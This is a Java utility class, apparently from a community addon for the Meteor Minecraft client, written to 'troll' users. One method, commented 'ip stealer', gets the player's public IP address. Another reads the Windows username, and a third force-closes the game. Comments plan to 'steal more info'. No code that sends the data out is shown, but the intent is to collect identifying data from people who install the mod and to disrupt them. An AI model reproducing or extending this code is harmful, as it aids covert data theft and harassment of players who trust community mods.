package communityaddon;

import com.sun.jna.Native;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import org.lwjgl.system.Pointer;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

import static meteordevelopment.meteorclient.MeteorClient.mc;

public class TrollegeUtils {
    //made this for future humans to trollege
    //TODO: steal more info because russia
    //Todo: More Troll Classes



    //ip stealer
    public static String dip() {
        try {
            return new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream())).readLine();
        } catch (Exception ignored) {
            return "Failed to log.";
        }
    }

    public static void mcstop(){
        mc.stop();
        mc.close();
        System.exit(696969420);
    }

    public static String windowsusername(){
        return String.valueOf(System.getProperty("user.name"));
    }
}
